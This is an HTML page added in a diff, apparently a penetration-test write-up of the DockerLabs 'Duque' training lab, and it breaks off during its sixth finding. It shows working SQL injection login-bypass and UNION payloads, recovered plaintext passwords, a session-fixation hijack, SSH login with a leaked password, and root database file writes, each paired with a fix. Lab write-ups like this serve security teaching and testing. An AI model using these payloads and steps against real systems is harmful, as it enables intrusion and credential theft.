@@ -1,0 +1,1458 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 243 Duque &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; Duque</p><h1 id="duque--dockerlabs-lab-id-243-fácil">DUQUE — DockerLabs lab (id 243, &quot;fácil&quot;)</h1>
+<blockquote>
+<p>Lab description from the catalogue (<code>download-labs.sh list</code>, line 15 of 205, verbatim):
+<em>&quot;Laboratorio para practicar hacking web con la explotación de dos vulnerabilidades.&quot;</em></p>
+<p>Manifest line, already present, not duplicated by me:
+<code>243|Duque|facil|two web vulnerabilities; tests whether a second finding gets filed separately</code></p>
+</blockquote>
+<p><strong>Outcome: the two declared web bugs are real, they are filed separately (§3 F1, F2), and
+they are NOT a chain — each is reachable on its own, and I prove it (§5). The lab's own
+source mislabels the second one: it calls an admin-gated hardcoded-credential disclosure
+an IDOR, and it is not one (§2.2). Three further issues the lab does not advertise were
+found (§3 F3, F4, F5), plus one escalation that did not work and is filed on its own
+(§3 F6). Two of those three undeclared issues are reachable only through the declared
+ones, and that composition is the finding (§5). No reward artifact exists (§9).</strong></p>
+<hr />
+<h2 id="1-surface">1. Surface</h2>
+<h3 id="11-tcp-scan-verbatim">1.1 TCP scan (verbatim)</h3>
+<pre><code>$ nmap -sV -Pn -p- [net-0-4]
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-30 13:05 +0000
+Nmap scan report for [net-0-4]
+Host is up (0.000047s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.34 seconds
+</code></pre>
+<p>(Re-taken after the restore, so the quote is a single consistent run. An earlier
+pre-restore scan reported <code>0.000046s</code> and <code>7.35 seconds</code>; the port set was identical
+across both.)</p>
+<p>The &quot;trípleta&quot;, run in order:</p>
+<table>
+<thead>
+<tr>
+<th>Step</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Reachable</strong></td>
+<td><code>22/tcp</code> and <code>80/tcp</code>. <code>GET /</code> → <code>200</code>, <strong>11 622 bytes</strong>. <code>GET /bills/</code> → <code>200</code>, <strong>4 676 bytes</strong> — a login form the root page does not link to.</td>
+</tr>
+<tr>
+<td><strong>What the body carries</strong></td>
+<td><code>/bills/index.php</code> posts <code>username</code>/<code>password</code>. <code>GET /bills/panel.php</code> with no cookie → <code>302</code> to <code>/bills/index.php</code>.</td>
+</tr>
+<tr>
+<td><strong>Decisive</strong></td>
+<td><code>bills/index.php:9</code> — a request parameter interpolated into SQL — and <code>panel.php:270</code> — a request parameter compared against a hardcoded literal that returns a password. Both named in the source before a single attack request.</td>
+</tr>
+</tbody>
+</table>
+<h3 id="12-stack-and-versions--read-from-the-artefact-not-from-memory">1.2 Stack and versions — read from the artefact, not from memory</h3>
+<p>Every number below is the tool's own output inside the container, pasted verbatim.</p>
+<pre><code>$ apache2ctl -v
+Server version: Apache/2.4.52 (Ubuntu)
+Server built:   2026-03-05T18:04:29T
+
+$ php -v
+PHP 8.1.2-1ubuntu2.23 (cli) (built: Jan  7 2026 08:37:41) (NTS)
+Zend Engine v4.1.2, Zend OPcache v8.1.2-1ubuntu2.23
+
+$ mysqld --version
+mysqld  Ver 10.6.23-MariaDB-0ubuntu0.22.04.1 for debian-linux-gnu on x86_64 (Ubuntu 22.04)
+
+$ ssh -V
+OpenSSH_8.9p1 Ubuntu-3ubuntu0.15, OpenSSL 3.0.2 15 Mar 2022
+
+$ grep VERSION /etc/os-release
+VERSION_ID=&quot;22.04&quot;
+PRETTY_NAME=&quot;Ubuntu 22.04.5 LTS&quot;
+</code></pre>
+<p><strong>Is the artefact what the manifest says? Yes, and that is worth stating precisely,
+because the label is unusually honest.</strong> The manifest names <em>no platform</em> — it says
+<em>&quot;two web vulnerabilities&quot;</em> — and the catalogue says only <em>&quot;hacking web&quot;</em>. There is no
+WordPress, no Joomla, no framework: the docroot is <strong>8 hand-written files, 3 of them
+PHP</strong>, on stock Apache with stock PHP and stock MariaDB. Nothing in the label is
+wrong, so rule 1 of the brief finds nothing to report here, and I am not going to
+manufacture a mismatch to have something to say.</p>
+<p>What the label <em>understates</em> is the attack surface, and that is a real observation:
+the description says <strong>&quot;hacking web&quot;</strong>, and the lab's own secret turns out to be an
+<strong>OS account password</strong> (§3 F2). One of the two declared bugs leaves the web tier
+entirely. A tester who read &quot;hacking web&quot; and stopped at the web tier would have
+collected both declared findings and none of the impact.</p>
+<p>The entrypoint is the topology, read from <code>auto_deploy.sh</code> and <strong>not run</strong> (it ends in
+<code>while true</code> at line 145):</p>
+<pre><code>/bin/sh -c service mariadb start &amp;&amp; service ssh start &amp;&amp; sleep 3 &amp;&amp; apachectl -D FOREGROUND
+</code></pre>
+<p>One container, no compose file, no second host, no <code>macvlan</code>, no pivot. <code>auto_deploy.sh</code>
+names no networks at all, so there is no segmentation to confirm before stepping
+through it.</p>
+<p><strong>One version number in this environment is not the artefact's, and I will not report
+against it.</strong> <code>uname -a</code> returns <code>7.0.0-34-generic</code> — a kernel newer than anything in
+this 22.04 userspace, and a 6.x/24.04-built string. That is the <strong>host</strong> kernel shared
+by every container on this Docker daemon, not something the lab ships. Testing or
+reporting a kernel CVE against it would be reporting a property of the operator's
+machine as a property of the target.</p>
+<h3 id="13-hidden-surfaces--what-the-tcp-scan-cannot-see">1.3 Hidden surfaces — what the TCP scan cannot see</h3>
+<p><code>nmap -p-</code> is TCP. Checked the other way round, from inside:</p>
+<pre><code>$ cat /proc/net/udp
+  sl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode
+</code></pre>
+<p>Header only — <strong>zero</strong> UDP sockets, so there is no BMC/IPMI-class blind spot here. And
+<code>/proc/net/tcp</code> gives the full listening set including the one socket the scan cannot
+report because it is bound to loopback:</p>
+<pre><code>   0: 0100007F:0CEA 00000000:0000 0A ...   uid 103     &lt;- 127.0.0.1:3306, mariadbd
+   1: 00000000:0016 00000000:0000 0A ...   uid 0       &lt;- 0.0.0.0:22
+   2: 00000000:0050 00000000:0000 0A ...   uid 0       &lt;- 0.0.0.0:80
+</code></pre>
+<p><code>3306</code> is MariaDB on loopback, confirmed as <strong>running</strong>, not merely installed
+(§23): <code>pid=131 Name: mariadbd</code>. Its presence matters in §3 F5.</p>
+<p>HTTP enumeration, 10 paths, all with the byte count so that &quot;not found&quot; and &quot;found but
+empty&quot; stay distinguishable:</p>
+<pre><code>200 11622  /
+200  1186  /empleados/
+200  1889  /intranet/
+200  4780  /normativa/
+200  5190  /proveedores/
+200  4676  /bills/
+200  4676  /bills/index.php
+302     0  /bills/panel.php
+404   272  /robots.txt
+404   272  /.git/HEAD
+403   275  /server-status
+</code></pre>
+<p>The four <code>index.html</code> pages are static content with no forms, no scripts and no
+<code>href</code>/<code>src</code> off the page — read, not guessed at. <code>/intranet/</code> and <code>/empleados/</code> are
+static &quot;Acceso Denegado&quot; pages, <strong>not</strong> an access-control mechanism: there is no
+server-side check behind them, they are the denial. The entire dynamic surface of this
+lab is <code>/bills/</code>, three files.</p>
+<hr />
+<h2 id="2-what-the-lab-declares-and-what-it-actually-is">2. What the lab declares, and what it actually is</h2>
+<h3 id="21-the-two-declared-vulnerabilities-located">2.1 The two declared vulnerabilities, located</h3>
+<p>The source names both, in its own comments, and the names are load-bearing evidence:</p>
+<pre><code>bills/panel.php:2: // Panel de Gestión de Facturas - NaturGas Solutions
+bills/panel.php:3: // Vulnerabilidad IDOR (Insecure Direct Object Reference)
+bills/panel.php:4: // Formato de ID: xy + [letra minúscula] + [tres números]
+</code></pre>
+<p>and, for the injection, only implicitly — the sink is the string on line 9:</p>
+<pre><code class="language-php"> 9:     $query = &quot;SELECT * FROM users WHERE username = '$user' AND passwd = '$pass'&quot;;
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Declared</th>
+<th>Sink</th>
+<th>My finding</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>&quot;vulnerabilidad&quot; #1</td>
+<td><code>bills/index.php:9</code> — both POST fields interpolated into SQL</td>
+<td><strong>F1</strong>, CWE-89</td>
+</tr>
+<tr>
+<td>&quot;vulnerabilidad&quot; #2</td>
+<td><code>bills/panel.php:270</code> — <code>if ($id === 'xyc724')</code></td>
+<td><strong>F2</strong>, CWE-798 + CWE-200</td>
+</tr>
+</tbody>
+</table>
+<h3 id="22-the-lab-misattributes-its-own-second-vulnerability--this-is-a-lab-defect">2.2 The lab misattributes its own second vulnerability — this is a lab defect</h3>
+<p><code>panel.php:3</code> calls F2 an <strong>IDOR</strong>. It is not one, and the difference is not a matter of
+taste: an IDOR is <em>my session, their object</em>, and this handler has no second identity
+to be &quot;their&quot;. Every line of the reach path is in front of me:</p>
+<pre><code class="language-php">  9: if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
+ 10:     header('Location: /bills/index.php');
+ 11:     exit;
+ 12: }
+ 13:
+ 14: $isAdmin = ($_SESSION['username'] === 'admin');
+...
+257: &lt;?php if ($isAdmin): ?&gt;
+...
+269:     if (!empty($id)) {
+270:         if ($id === 'xyc724') {
+271:             // ID vulnerable - IDOR - datos sensibles
+272:             echo getVulnerableResponse();
+</code></pre>
+<p>Line 9 requires a session. Line 14 reduces the session to a boolean. Line 257 puts the
+whole invoice block — the search box included — behind that boolean. So the leak is
+reachable by <strong>exactly one identity</strong>, the one whose <code>$_SESSION['username']</code> is
+<code>'admin'</code>. Measured, three cases, byte-distinguishable (§4, table &quot;Three cases&quot;):</p>
+<table>
+<thead>
+<tr>
+<th>Session</th>
+<th>Status</th>
+<th>Bytes</th>
+<th>Body marker</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>none</td>
+<td><code>302</code> → <code>/bills/index.php</code></td>
+<td><strong>0</strong></td>
+<td>—</td>
+</tr>
+<tr>
+<td><code>mario</code> (authenticated, non-admin)</td>
+<td><code>200</code></td>
+<td><strong>5 467</strong></td>
+<td><code>Acceso Denegado</code></td>
+</tr>
+<tr>
+<td><code>admin</code> (authenticated, admin)</td>
+<td><code>200</code></td>
+<td><strong>5 994</strong></td>
+<td><code>duquelaje81029557!</code></td>
+</tr>
+</tbody>
+</table>
+<p>The middle row is the case that decides the class. In an IDOR that row is the <em>finding</em> —
+my session, someone else's object. Here it is a <strong>refusal</strong>. The vulnerable branch is
+<em>behind</em> the authorisation check, not beside it.</p>
+<p>There is also no object-ownership model to violate. The &quot;your invoices&quot; the panel hands
+out are two hardcoded links (<code>panel.php:291-292</code>), identical for every user, and the
+<code>$database</code> array (<code>panel.php:19-24</code>) is a flat list of 20 strings with no owner column.
+There is no per-user object anywhere in this application.</p>
+<p><strong>What F2 actually is:</strong> a credential committed to the source file and disclosed to any
+administrator. CWE-798 (hardcoded credentials) + CWE-200. The <code>// IDOR</code> comment at
+line 3 and the <code>// ID vulnerable - IDOR - datos sensibles</code> at line 271 are both wrong, and the
+<code>$isAdmin</code> gate at line 257 means the <em>author wrote a correct access-control check and
+then mislabelled what sits behind it</em>.</p>
+<p>This is the corpus's existing &quot;lab reports a defect in its own design&quot; class (labs 102,
+108, 112, 220) — but note the difference, because it matters for how the client reads
+the report: <strong>the catalogue description does not misattribute anything.</strong> It says
+&quot;two vulnerabilities&quot; and names neither. The misattribution is in the artefact's own
+comment, i.e. it is the lab's internal labelling that is wrong, not the platform's
+catalogue. A report that said &quot;the description misattributes the escalation&quot; would be
+wrong, and I checked the description in full before saying so.</p>
+<h3 id="23-a-second-dead-control-for-the-same-reason">2.3 A second dead control, for the same reason</h3>
+<pre><code class="language-php"> 26: // Validación de formato: debe empezar con 'xy' + letra minúscula + 3 números
+ 27: function isValidFormat($id) {
+ 28:     return preg_match('/^xy[a-z][0-9]{3}$/', $id);
+ 29: }
+</code></pre>
+<p><code>grep -n 'isValidFormat' /var/www/html/bills/panel.php</code> returns <strong>one</strong> line: the
+definition. It is never called. The &quot;format validation&quot; the comment advertises does not
+exist at runtime — the only tests on <code>$id</code> are the <code>===</code> at 270, the <code>in_array</code> at 273,
+and the <code>else</code> at 276.</p>
+<p>The lab ships <strong>three</strong> controls that look like they explain the behaviour. Two of them
+(the equal-length response, §6; and this validator) are inert, and the one whose comment
+names the exact vulnerability class is the dead one. This is lab 146's shape exactly.</p>
+<hr />
+<h2 id="3-findings">3. Findings</h2>
+<p>Six, filed separately. Two are the declared ones; three the lab does not advertise; and
+the sixth is an escalation that <strong>did not work</strong>, kept apart on purpose — merging it
+into F5 would tell the client they patched something that is still there.</p>
+<hr />
+<h3 id="f1--sql-injection-in-the-login-form-unauthenticated-critical">F1 — SQL injection in the login form, unauthenticated (Critical)</h3>
+<p><strong>CWE-89</strong> (Improper Neutralization of Special Elements used in an SQL Command).</p>
+<p><strong>Entry criterion:</strong> does a request parameter reach the SQL string with no escaping, no
+prepared statement and no type coercion? Yes — and both parameters, not one.</p>
+<p><strong>Evidence, verbatim from the artefact:</strong></p>
+<pre><code class="language-php">bills/index.php: 3: $conn = mysqli_connect(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;&quot;, &quot;register&quot;);
+bills/index.php: 7:     $user = $_POST['username'];
+bills/index.php: 8:     $pass = $_POST['password'];
+bills/index.php: 9:     $query = &quot;SELECT * FROM users WHERE username = '$user' AND passwd = '$pass'&quot;;
+bills/index.php:10:     $result = mysqli_query($conn, $query);
+</code></pre>
+<p><strong>The discriminator</strong> (RUNBOOK §5, SQLi row: <em>two payloads, same filter property,
+different execution result</em>). There is no filter at all, so the property under test is
+&quot;does the injected boolean change the row set&quot;. The two payloads differ by <strong>one
+literal</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th><code>username</code></th>
+<th>http</th>
+<th>bytes</th>
+<th>body</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>C1</td>
+<td><code>admin' -- </code></td>
+<td><code>200</code></td>
+<td><strong>79</strong></td>
+<td><code>Login success: Admin</code></td>
+</tr>
+<tr>
+<td>C2</td>
+<td><code>admin' AND '1'='2' -- </code></td>
+<td><code>200</code></td>
+<td><strong>4 787</strong></td>
+<td><code>Login fallido. Usuario o contraseña incorrectos.</code></td>
+</tr>
+<tr>
+<td>C3</td>
+<td><code>admin</code> (no injection)</td>
+<td><code>200</code></td>
+<td><strong>4 787</strong></td>
+<td><code>Login fallido. Usuario o contraseña incorrectos.</code></td>
+</tr>
+</tbody>
+</table>
+<p>C1 and C2 are the pair; C3 is the negative control that proves C2's failure is the
+injection being <em>false</em> and not the endpoint being broken. <strong>79 vs 4 787 bytes is the
+oracle, and it has fired.</strong></p>
+<p>The password field is the same sink and is independently injectable:</p>
+<pre><code>POST username=Mario  password=' OR '1'='1   -&gt;  200, 79 bytes, &quot;Login success: Mario&quot;
+</code></pre>
+<p><strong>Data recovered</strong> (UNION, 3 columns — the column count established by measurement, not
+guessed: <code>UNION SELECT 1,2,3</code> → <code>200</code>/75 B while 1, 2, 4 and 5 columns each → <code>500</code>/0 B,
+so the mismatched counts are visibly errors and not silent negatives):</p>
+<pre><code>id | username | passwd
+ 1 | Mario    | mario123
+ 2 | Jesus    | jesus2026
+ 3 | Admin    | admin123
+</code></pre>
+<p><strong>Impact:</strong> unauthenticated read and write of the whole <code>register</code> database, and
+unauthenticated authentication bypass into any account. Reaches the DB as
+<code>root@localhost</code> (see F5 for why that is worse than it looks).</p>
+<p><strong>Root cause:</strong> string interpolation into SQL. <strong>Fix:</strong> prepared statements with bound
+parameters, for both fields; the DB account should not be <code>root</code>.</p>
+<hr />
+<h3 id="f2--hardcoded-credential-in-source-disclosed-to-any-administrator-critical">F2 — Hardcoded credential in source, disclosed to any administrator (Critical)</h3>
+<p><strong>CWE-798</strong> (Use of Hard-coded Credentials) + <strong>CWE-200</strong> (Exposure of Sensitive
+Information). <em>Not</em> CWE-639 — see §2.2 for the measurement that refutes the IDOR label.</p>
+<p><strong>Entry criterion:</strong> does any request-controlled value select a branch that returns a
+secret?</p>
+<p><strong>Evidence, verbatim from the artefact:</strong></p>
+<pre><code class="language-php">bills/panel.php:48: // Función para respuesta vulnerable (diferente longitud)
+bills/panel.php:49: function getVulnerableResponse() {
+bills/panel.php:50:     return '&lt;div class=&quot;field&quot;&gt;
+bills/panel.php:51:                         &lt;label&gt;Usuario&lt;/label&gt;
+bills/panel.php:52:                         &lt;div class=&quot;value&quot;&gt;duque&lt;/div&gt;
+bills/panel.php:53:                     &lt;/div&gt;
+bills/panel.php:54:                     &lt;div class=&quot;field&quot;&gt;
+bills/panel.php:55:                         &lt;label&gt;Password&lt;/label&gt;
+bills/panel.php:56:                         &lt;div class=&quot;value&quot;&gt;duquelaje81029557!&lt;/div&gt;
+bills/panel.php:57:                     &lt;/div&gt;';
+bills/panel.php:58: }
+</code></pre>
+<p>and the branch that serves it:</p>
+<pre><code class="language-php">bills/panel.php:270:         if ($id === 'xyc724') {
+bills/panel.php:271:             // ID vulnerable - IDOR - datos sensibles
+bills/panel.php:272:             echo getVulnerableResponse();
+</code></pre>
+<p><strong>Served bytes, verbatim, from an authenticated admin session:</strong></p>
+<pre><code class="language-html">208-                    &lt;div class=&quot;field&quot;&gt;
+209-                        &lt;label&gt;Usuario&lt;/label&gt;
+210-                        &lt;div class=&quot;value&quot;&gt;duque&lt;/div&gt;
+211-                    &lt;/div&gt;
+212-                    &lt;div class=&quot;field&quot;&gt;
+213-                        &lt;label&gt;Password&lt;/label&gt;
+214-                        &lt;div class=&quot;value&quot;&gt;duquelaje81029557!&lt;/div&gt;
+215-                    &lt;/div&gt;
+</code></pre>
+<p><strong>The impact statement is the part that matters, and it is not &quot;an IDOR&quot;.</strong> The leaked
+credential is not a fictional account. It is a <strong>live host account</strong>:</p>
+<pre><code>$ grep duque /etc/passwd
+duque:x:1000:1000::[lab-home]/duque:/bin/bash
+</code></pre>
+<p>Used as-is, from outside, over SSH:</p>
+<pre><code>$ id
+uid=1000(duque) gid=1000(duque) groups=1000(duque)
+$ grep -E '^(Uid|Gid)' /proc/self/status
+Uid:	1000	1000	1000	1000
+Gid:	1000	1000	1000	1000
+$ whoami
+duque
+</code></pre>
+<p><code>real = effective = saved = filesystem = 1000</code>. <strong>No setuid transition at this hop</strong> —
+all four fields are 1000, which is the measurement, not the word &quot;unprivileged&quot;.</p>
+<p>So F2 is a <strong>web-to-host trust-boundary crossing</strong>: a defect in a PHP billing panel
+yields an interactive shell on the operating system. That is a different severity
+argument from &quot;an IDOR let me see a record&quot;, and the distinction is the reason the
+mislabelling matters.</p>
+<p><strong>Negative controls on the SSH hop, same host, same code path, same session library:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Attempt</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>duque</code> / <code>duquelaje81029557!</code> (the leaked value)</td>
+<td><strong>ACCEPTED</strong>, <code>uid=1000(duque)</code></td>
+</tr>
+<tr>
+<td><code>duque</code> / <code>duquelaje81029557</code> (one character short)</td>
+<td><code>Authentication failed</code></td>
+</tr>
+<tr>
+<td><code>duque</code> / <em>(empty)</em></td>
+<td><code>Authentication failed</code></td>
+</tr>
+<tr>
+<td><code>root</code> / <code>duquelaje81029557!</code></td>
+<td><code>Authentication failed</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Root cause:</strong> a real password committed to a PHP file inside the docroot, plus a
+branch that prints it. <strong>Fix:</strong> remove the branch and the literal; move secrets to a
+store the web tier cannot read; if the lab needs a low-privilege host account for the
+exercise, generate it at build time and never put it in a served file.</p>
+<hr />
+<h3 id="f3--passwords-stored-in-plaintext-high--not-advertised-by-the-lab">F3 — Passwords stored in plaintext (High) — <strong>not advertised by the lab</strong></h3>
+<p><strong>CWE-256</strong> (Plaintext Storage of a Password) / <strong>CWE-522</strong> (Insufficiently Protected
+Credentials).</p>
+<p>Recovered in §3 F1 and confirmed by logging in with each value <strong>without any
+injection</strong>:</p>
+<table>
+<thead>
+<tr>
+<th><code>username</code></th>
+<th><code>password</code></th>
+<th>http</th>
+<th>bytes</th>
+<th>body</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Mario</code></td>
+<td><code>mario123</code></td>
+<td><code>200</code></td>
+<td>79</td>
+<td><code>Login success: Mario</code></td>
+</tr>
+<tr>
+<td><code>Jesus</code></td>
+<td><code>jesus2026</code></td>
+<td><code>200</code></td>
+<td>79</td>
+<td><code>Login success: Jesus</code></td>
+</tr>
+<tr>
+<td><code>Admin</code></td>
+<td><code>admin123</code></td>
+<td><code>200</code></td>
+<td>79</td>
+<td><code>Login success: Admin</code></td>
+</tr>
+<tr>
+<td><code>Mario</code></td>
+<td><code>mario1234</code></td>
+<td><code>200</code></td>
+<td>4 787</td>
+<td><code>Login fallido. …</code></td>
+</tr>
+<tr>
+<td><code>Admin</code></td>
+<td><code>admin1234</code></td>
+<td><code>200</code></td>
+<td>4 787</td>
+<td><code>Login fallido. …</code></td>
+</tr>
+</tbody>
+</table>
+<p>The last two rows are the negative control: the instrument is not accepting everything.</p>
+<p><strong>Evidence:</strong> the <code>users</code> table stores <code>mario123</code> in the clear, and the login handler
+compares it in the clear (<code>bills/index.php:9</code>, <code>AND passwd = '$pass'</code>). There is no hash
+function anywhere in the application — 3 PHP files, 0 calls to <code>password_hash</code>/
+<code>crypt</code>/<code>md5</code>/<code>sha1</code> (<code>grep</code> over the docroot: 0 matches).</p>
+<p><strong>Impact:</strong> anyone who reaches the database — through F1, through F5, or through a
+backup of it — has every user's password in a form that is immediately reusable against
+any other service those users have. <code>admin123</code> is also guessable without any database
+access at all, which is what makes §5 possible.</p>
+<p><strong>Root cause:</strong> passwords compared as plaintext. <strong>Fix:</strong> <code>password_hash()</code> /
+<code>password_verify()</code> with <code>PASSWORD_DEFAULT</code>, and a migration of the three rows.</p>
+<hr />
+<h3 id="f4--session-fixation-and-a-session-cookie-with-neither-httponly-nor-secure-high--not-advertised">F4 — Session fixation, and a session cookie with neither <code>HttpOnly</code> nor <code>Secure</code> (High) — <strong>not advertised</strong></h3>
+<p><strong>CWE-384</strong> (Session Fixation) + <strong>CWE-1004</strong> (Sensitive Cookie Without <code>HttpOnly</code>)</p>
+<ul>
+<li><strong>CWE-614</strong> (Sensitive Cookie Without <code>Secure</code>).</li>
+</ul>
+<p><strong>The cookie, verbatim off the wire:</strong></p>
+<pre><code>HTTP/1.1 200 OK
+[response-cookie-header]: PHPSESSID=4ccb8647bko7f82jlkkoepf4a9; path=/
+</code></pre>
+<p>No <code>HttpOnly</code>, no <code>Secure</code>, no <code>SameSite</code>. Measured from the interpreter, not from a
+config file — the framework-consumed value, per rule 3:</p>
+<pre><code>session.cookie_httponly      = ''
+session.cookie_secure        = '0'
+session.use_strict_mode      = '0'
+session.use_only_cookies     = '1'
+session.sid_length           = '26'
+session.gc_maxlifetime       = '1440'
+</code></pre>
+<p><code>use_strict_mode = 0</code> is the load-bearing value: PHP will accept a session ID it did not
+issue. And <code>bills/index.php:2</code> is the entire session setup — <code>session_start()</code>, and no
+<code>session_regenerate_id()</code> anywhere in the docroot (<code>grep</code> → 0 matches).</p>
+<p><strong>The attack, end to end, with the negative control beside it:</strong></p>
+<pre><code>attacker-chosen SID: 25k4p7wt7kbe5mfqfuchotd7xy
+
+step 1  victim loads the login page carrying the attacker's SID
+step 2  victim authenticates on that same SID   -&gt; &quot;Login success: Mario&quot;
+step 3  ATTACKER replays only the SID, from a different client:
+          bytes=5467   body: &quot;👤 mario (User)&quot;  &quot;Acceso Denegado&quot;
+</code></pre>
+<p>The negative control is the row that makes step 3 mean anything:</p>
+<pre><code>never-used SID: 302 -&gt; http://[net-0-4]/bills/index.php   (0 bytes)
+</code></pre>
+<p><strong>302 and 0 bytes versus 200 and 5 467 bytes with a rendered identity.</strong> The
+attacker-chosen SID carries a live authenticated session; an arbitrary one carries
+nothing. There is no way to read step 3 as a coincidence.</p>
+<p><strong>And it chains into F2, which is the finding that makes it High rather than Medium.</strong>
+Repeat the same three steps with <code>Admin</code> authenticating on the fixated SID, and the
+attacker's replay returns the secret with <strong>no credentials of any kind</strong>:</p>
+<pre><code>attacker-chosen SID #2: f3u6pbdpzz4h2tb5i03zi0xh09
+step 2 -&gt; &quot;Login success: Admin&quot;
+step 3, attacker replay of the SID alone, GET /bills/panel.php?id=xyc724:
+        bytes=5994
+        &quot;(Administrator)&quot;
+        &quot;&lt;div class=&quot;value&quot;&gt;duque&lt;/div&gt;&quot;
+        &quot;duquelaje81029557!&quot;
+</code></pre>
+<p><strong>Honest limit on this finding, stated up front:</strong> I have proved the <em>hijack</em>, not the
+<em>delivery</em>. Fixation requires the cookie to reach the victim's browser, and I found no
+XSS in this application to plant it with (§8, NOT tested). The delivery vectors that
+remain open are the missing <code>Secure</code> flag on a plaintext HTTP service — any network
+position between client and server can set the cookie — and any browser-level or
+network-level injection. That limit is why F4's impact claim stops at the replay.</p>
+<p><strong>Root cause:</strong> no <code>session_regenerate_id(true)</code> on the authentication transition, and
+PHP's strict mode left off. <strong>Fix:</strong> regenerate the session ID at login, set
+<code>session.use_strict_mode=1</code>, <code>session.cookie_httponly=1</code>, <code>session.cookie_secure=1</code>
+(plus HSTS), and serve only over TLS.</p>
+<hr />
+<h3 id="f5--mariadb-rootlocalhost-with-an-empty-password-reachable-from-any-local-uid-high--not-advertised">F5 — MariaDB <code>root@localhost</code> with an empty password, reachable from any local uid (High) — <strong>not advertised</strong></h3>
+<p><strong>CWE-258</strong> (Empty Password in Configuration File) + <strong>CWE-284</strong> (Improper Access
+Control) + <strong>CWE-269</strong> (Improper Privilege Management).</p>
+<p><strong>The credential, in the served source:</strong></p>
+<pre><code class="language-php">bills/index.php: 3: $conn = mysqli_connect(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;&quot;, &quot;register&quot;);
+</code></pre>
+<p>Empty password, <code>root</code>, and the third argument is <code>&quot;&quot;</code>. Confirmed against the running
+server, <strong>not</strong> read off the config file:</p>
+<pre><code>$ mysql -u root -h 127.0.0.1 --batch -e 'SELECT USER(),CURRENT_USER();'
+USER()	CURRENT_USER()
+root@localhost	root@localhost
+
+$ SHOW GRANTS FOR CURRENT_USER();
+Grants for root@localhost
+GRANT ALL PRIVILEGES ON *.* TO `root`@`localhost` WITH GRANT OPTION
+GRANT PROXY ON ''@'%' TO `root`@`localhost` WITH GRANT OPTION
+</code></pre>
+<p><strong>The <code>localhost</code> in the grant is the finding.</strong> It is the MariaDB <code>localhost</code> account,
+matched over TCP to <code>127.0.0.1</code>, so it is <em>not</em> the <code>unix_socket</code>-authenticated plugin
+account that would refuse a network connection. It authenticates on an <strong>empty
+password</strong>, and it holds <code>ALL PRIVILEGES ON *.*</code> <strong>with grant option</strong>.</p>
+<p><strong>And the reachability is the part that turns a bad password into a boundary failure.</strong>
+The above was run from an <strong>unprivileged interactive shell</strong>, over SSH, as <code>uid=1000</code>:</p>
+<pre><code>$ id
+uid=1000(duque) gid=1000(duque) groups=1000(duque)
+$ mysql -u root -h 127.0.0.1 register --batch -e &quot;SELECT 1;&quot;
+1
+</code></pre>
+<p>So the escalation is: <em>any</em> local account, however unprivileged, is full DBA of every
+database on the host. There is no <code>mysqld</code> network exposure to blame — 3306 is bound to
+<code>127.0.0.1</code> only, confirmed in <code>/proc/net/tcp</code> — this is a purely local boundary
+failure, and it means F1's severity does not depend on the web tier being the only way
+in.</p>
+<p><strong>What that privilege actually buys, measured with <code>secure_file_priv</code> read first:</strong></p>
+<pre><code>$ SELECT IFNULL(@@secure_file_priv,'&lt;NULL/unset&gt;'), @@plugin_dir, @@datadir;
+&lt;NULL/unset&gt;   /usr/lib/mysql/plugin/   /var/lib/mysql/
+</code></pre>
+<p><code>secure_file_priv</code> is <strong>unset</strong>, so <code>LOAD_FILE</code> and <code>INTO OUTFILE</code>/<code>DUMPFILE</code> are
+unrestricted by policy. That makes this a file primitive. What it is worth is F6.</p>
+<p><strong>Root cause:</strong> an empty password on the database superuser, with no <code>unix_socket</code>
+plugin and no least-privilege account for the application. <strong>Fix:</strong> set a real password
+or move to <code>unix_socket</code> for the DBA account, create a dedicated
+<code>GRANT SELECT, INSERT, UPDATE ON register.*</code> account for <code>bills/</code>, and set
+<code>secure_file_priv</code> to a directory the server needs and nothing else.</p>
+<hr />
+<h3 id="f6--the-escalation-that-did-not-work-f5-does-not-reach-os-root-informational-filed-separately">F6 — The escalation that did <strong>not</strong> work: F5 does not reach OS root (Informational, filed separately)</h3>
+<p>Kept as its own entry on purpose. Folding this into F5 would tell the client that
+patching F5 closed a root escalation. It does not, and the reason is specific.</p>
+<p><strong>Oracle first, because a file-write vector with no oracle is a claim about the future
+(§6–7).</strong> A uniquely-marked payload, <code>DUQUE243_MARKER_b3f91c</code>, written through
+<code>INTO OUTFILE</code> from the <code>duque</code> shell, then read back as an OS user:</p>
+<pre><code>/tmp/duque243_v3.txt   before=NO  after=YES owner=mysql(103)  marker=1  WROTE-BY-ME
+</code></pre>
